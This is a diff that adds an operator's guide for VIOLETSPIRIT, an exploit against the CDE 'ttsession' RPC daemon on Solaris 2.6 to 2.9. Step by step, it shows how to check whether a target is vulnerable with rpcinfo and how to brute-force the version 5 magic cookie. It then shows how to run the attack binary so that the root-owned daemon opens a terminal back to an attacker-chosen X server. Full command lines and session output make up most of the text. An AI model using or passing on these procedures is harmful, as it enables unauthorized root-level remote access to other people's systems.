@@ -1,0 +1,344 @@
+VIOLETSPIRIT can be used against versions 4 and 5 of the "ttsession" 
+daemon found in the Common Desktop Environment (CDE) Solaris 2.X, on both SPARC
+and x86 platforms.  As of this writing (21 May 2003), it has been successfully 
+tested against...
+
+    Solaris 2.6 SPARC ("ttsession" version 4)
+    Solaris 2.6 x86   ("ttsession" version 4)
+    Solaris 2.7 SPARC ("ttsession" versions 4 and 5)
+    Solaris 2.7 x86   ("ttsession" versions 4 and 5)
+    Solaris 2.8 SPARC ("ttsession" version 5)
+    Solaris 2.8 x86   ("ttsession" version 5)
+    Solaris 2.9 SPARC ("ttsession" version 5)
+    Solaris 2.9 x86   ("ttsession" version 5)
+
+The VIOLETSPIRIT exploit, if successful, sets up a "dtterm" terminal
+connected to an X server of your choice over a TCP connection.  VIOLETSPIRIT
+can also be redirected via various redirection tools.
+
+Platform-specific run-time instructions can be found below. I give
+1 example for a version 4 exploit, and 1 example for a version 5 exploit, as
+they involve slightly different processes.  A version 4 exploit involves just
+an attack, while a version 5 involves a bit more...
+
+=============================================================================
+=============================================================================
+(Solaris 2.6 SPARC target, "ttsession" version 4)............................
+
+###### Are they vulnerable???
+$ rpcinfo -p 555.1.9.56
+.
+.
+.
+1342177279    4   tcp  32786
+1342177279    1   tcp  32786
+1342177279    3   tcp  32786
+1342177279    2   tcp  32786
+$
+
+## Okay, he looks like a Solaris 2.6 box, running "ttsession" version 4...
+## 
+## What options do we have?
+$ ./vs.attack.linux
+Please specify tgt IP address and hostname
+Usage: ./vs.attack.linux -i tgt_ipaddr -h tgt_hostname -x xserver_port
+  optional args:
+    [-c cb_ipaddr]   : default use my ip addr
+    [-p cb_port]     : callback port (default random)
+    [-n tcp_port]    : default use portmapper to determine
+    [-7]               use Solaris 7+ default ttsession program number 1289637086(0x4cde4cde)
+                     : default use Solaris 6- ttsession program number 1342177279(0x4fffffff)
+    [-r rpcprognum]  : ttsession program number if different from defaults
+    [-v rpc version] : default 4 : Solaris 8 and other patched versions use version 5
+    [-T seconds]       set approx time at which target ttsession started for version 5 rpc
+                       time is in seconds since epoch
+    [-t microsecs]     refine approx time at which target ttsession started
+                       time is in microseconds
+    [-q xserver_ip]    default <my ip>
+$ 
+
+## For Solaris 2.6, version 4...to display a "dtterm" back to the
+##   X server at 555.1.2.48:0.0...
+$ ./vs.attack.linux -i 555.1.9.56 -h murray -q 555.1.2.48 -x 6000 -n 32786
+Client created
+
+rendez ip is set to 555.1.2.48
+
+tgt ttsession is using port 32786
+
+Got from target: TT Session ID: P 01 354 1342177279 1 0 0 555.1.9.56 4
+
+TT Session is using program number 0x4fffffff
+
+TT Session is process id 354 being run by uid 0
+
+  continue ...
+
+## VIOLETSPIRIT prompts the user at several points, to establish visual
+##   verification of the protocol interactions before proceeding to the
+##   next step.  Assuming everything looks okay, just hit the "Enter" key
+##   at the "continue..." prompt to keep on going...
+
+Got from target: TT Process ID: 1._jhjr
+
+TT session start time 1052162933 Mon May  5 14:28:53 2003
+
+TT pid 1
+
+  continue ...
+
+Associate process id
+
+assoc_process_id: starting cookie time at 1052162933 0
+port 33721 (0x83b9) bound for listening
+
+
+Mon May  5 15:42:22 2003
+
+Going for cb accept
+Done cb acccept
+
+Your Xserver should be running on 555.1.2.48 port 6000
+
+About to tell the target to create a DT Terminal on DISPLAY 547725836848:67108864.1097364144128
+
+  continue ...
+
+## Okay...when you hit "Enter" here, the target will attempt to display
+##   a "dtterm" back to your prespecified X server...better have one up
+##   and waiting...
+
+SDT_go_term - got success on cb
+SDT_go_term done
+0x00000000
+0x00000001
+>>> BITS 0x01120635
+0x01 = 0
+STATE = 5 TT_STARTED
+0x10 = 1
+0x20 = 2
+
+
+0x200 RESULT = 0
+No of args = 00000000
+
+0x00000400 = 00000008
+
+Handler P Type: SDT_Terminal
+No of contexts = 00000001
+
+$DISPLAY: 0x00000000 arg type 3 string: 0xffffffff c type 2 "547725836848:67108864.1097364144128"
+More data = 00000016
+
+## At this point, after a short delay, you should see a "dtterm" pop up on
+##   your prespecified X server.  Watch the "tcpdump" window...you'll see 
+##   _lots_ of TCP traffic being exchanged between your X server and the
+##   target...
+
+
+All done - press return to close down the tcp stream
+
+## Hit "Enter" one more time, for a graceful closeout of VIOLETSPIRIT.
+
+$ 
+
+=============================================================================
+=============================================================================
+(Solaris 2.9 x86 target, "ttsession" version 5)............................
+
+###### Are they vulnerable???
+$ rpcinfo -p 555.1.3.42
+  program vers proto   port
+.
+.
+.
+1289637086    5   tcp  33143
+1289637086    1   tcp  33143
+
+$ 
+
+## Okay, he looks like a Solaris 2.7+ box, running "ttsession" version 5...
+## 
+## First we need to get the times for the magic cookie for the attack to work
+## What options do we have?
+
+## Because the "gettime" binary is uploaded to targets, no usage is ever printed 
+## But here are the options:
+
+$ ./vs.gettime.sol.sparc
+Please specify tgt IP address and hostname
+Usage: ./vs.get.sol.sparc -i tgt_ipaddr -h tgt_hostname
+  optional args:
+    [-c cb_ipaddr]   : default use my ip addr
+    [-p cb_port]     : callback port (default random)
+    [-n tcp port]    : default use portmapper to determine
+    [-r rpcprognum]
+    [-T seconds]       set approx time at which target ttsession started for version 5 rpc
+                       time is in seconds since epoch
+    [-t microsecs]     refine approx time at which target ttsession started
+                       time is in microseconds
+
+## We're now getting the times for the magic cookie.  This will take several minutes ON
+## AVERAGE over a fast link, it is STRONGLY discouraged to run this over a dialup
+## connection unless you enjoy staring at slowly printed dots for hours on end.
+## If at all possible, upload this somewhere else and lose the dialup bottleneck.
+
+## For Solaris 2.7+, version 5...to get the proper times needed for the attack
+$ ./vs.get.sol.sparc -i 555.1.3.42 -h dellosaurus -n 33143
+Client created
+
+rendez ip is set to 555.1.2.48
+
+tgt ttsession is using port 33143
+
+Got from target: TT Session ID: P 01 7449 1289637086 1 1 0 555.1.3.42 5 dellosaurus
+
+TT Session is using program number 0x4cde4cde
+
+TT Session is process id 7449 being run by uid 0
+
+  continue ...
+
+gss_getinfo returned: 0xffffffff 0xffffffff 0xffffffff
+
+Got from target: TT Process ID: 1._jiOG
+
+TT session start time 1052165648 Mon May  5 15:14:08 2003
+
+TT pid 1
+
+  continue ...
+
+## VIOLETSPIRIT prompts the user at several points, to establish visual
+##   verification of the protocol interactions before proceeding to the
+##   next step.  Assuming everything looks okay, just hit the "Enter" key
+##   at the "continue..." prompt to keep on going...
+
+Associate process id
+
+assoc_process_id: starting cookie time at 1052165648 0
+Mon May  5 16:21:17 2003
+port 33733 (0x83c5) bound for listening
+.................................................. Mon May  5 16:22:16 2003
+.................................................. Mon May  5 16:23:19 2003
+.................................................. Mon May  5 16:24:19 2003
+.................................................. Mon May  5 16:25:16 2003
+.................................................. Mon May  5 16:26:14 2003
+.................................................. Mon May  5 16:27:11 2003
+.................................................. Mon May  5 16:28:08 2003
+.................................................. Mon May  5 16:29:06 2003
+.................................................. Mon May  5 16:30:04 2003
+.................................................. Mon May  5 16:31:01 2003
+.................................................. Mon May  5 16:31:58 2003
+.................................................. Mon May  5 16:32:56 2003
+.................................................. Mon May  5 16:33:53 2003
+.................................................. Mon May  5 16:34:51 2003
+.........................
+
+Mon May  5 16:35:20 2003
+
+Good cookie found using times 1052165648 725142
+$
+
+## Cool!  We found the times to make the magic cookie.
+## Let's now see our attack options
+$ ./vs.attack.linux
+Must specify time values with rpc version 5
+Usage: ./vs.attack.linux -i tgt_ipaddr -h tgt_hostname -x xserver_port
+  optional args:
+    [-c cb_ipaddr]   : default use my ip addr
+    [-p cb_port]     : callback port (default random)
+    [-n tcp_port]    : default use portmapper to determine
+    [-7]               use Solaris 7+ default ttsession program number 1289637086(0x4cde4cde)
+                     : default use Solaris 6- ttsession program number 1342177279(0x4fffffff)
+    [-r rpcprognum]  : ttsession program number if different from defaults
+    [-v rpc version] : default 4 : Solaris 8 and other patched versions use version 5
+    [-T seconds]       set approx time at which target ttsession started for version 5 rpc
+                       time is in seconds since epoch
+    [-t microsecs]     refine approx time at which target ttsession started
+                       time is in microseconds
+    [-q xserver_ip]    default <my ip>
+$
+
+## Now, for the attack...
+$ ./vs.attack.linux -i 555.1.3.42 -h dellosaurus -n 33143 -7 -v 5 -c 555.1.2.48 -q 555.1.2.48 -x 6000 -T 1052165648 -t 725142
+Client created
+
+rendez ip is set to 555.1.2.48
+
+tgt ttsession is using port 33143
+
+Got from target: TT Session ID: P 01 7449 1289637086 1 1 0 555.1.3.42 5 dellosaurus
+
+TT Session is using program number 0x4cde4cde
+
+TT Session is process id 7449 being run by uid 0
+
+  continue ...
+
+gss_getinfo returned: 0xffffffff 0xffffffff 0xffffffff
+
+Got from target: TT Process ID: 2._jiOG
+
+TT session start time 1052165648 Mon May  5 15:14:08 2003
+
+TT pid 2
+
+  continue ...
+
+Associate process id
+
+assoc_process_id: starting cookie time at 1052165648 725142
+Mon May  5 17:19:13 2003
+port 33737 (0x83c9) bound for listening
+
+
+Mon May  5 17:19:13 2003
+
+Good cookie found using times 1052165648 725142
+Going for cb accept
+Done cb acccept
+
+Your Xserver should be running on 555.1.2.48 port 6000
+
+About to tell the target to create a DT Terminal on DISPLAY 547725836848:67108864.1097364144128
+
+  continue ...
+
+## EUREKA!!!  When you hit "Enter" here, the target will attempt to display
+##   a "dtterm" back to your prespecified X server...better have one up
+##   and waiting...
+
+SDT_go_term done
+0x00000000
+0x00000001
+>>> BITS 0x01120635
+0x01 = 0
+STATE = 5 TT_STARTED
+0x10 = 1
+0x20 = 2
+
+
+0x200 RESULT = 0
+No of args = 00000000
+
+0x00000400 = 00000008
+
+Handler P Type: SDT_Terminal
+No of contexts = 00000001
+
+$DISPLAY: 0x00000000 arg type 3 string: 0xffffffff c type 2 "547725836848:67108864.1097364144128"
+More data = 00000016
+
+## At this point, after a short delay, you should see a "dtterm" pop up on
+##   your prespecified X server.  Watch the "tcpdump" window...you'll see 
+##   _lots_ of TCP traffic being exchanged between your X server and the
+##   target...
+
+All done - press return to close down the tcp stream
+
+## Hit "Enter" one more time, for a graceful closeout of VIOLETSPIRIT.
+
+$ 
+
+ 
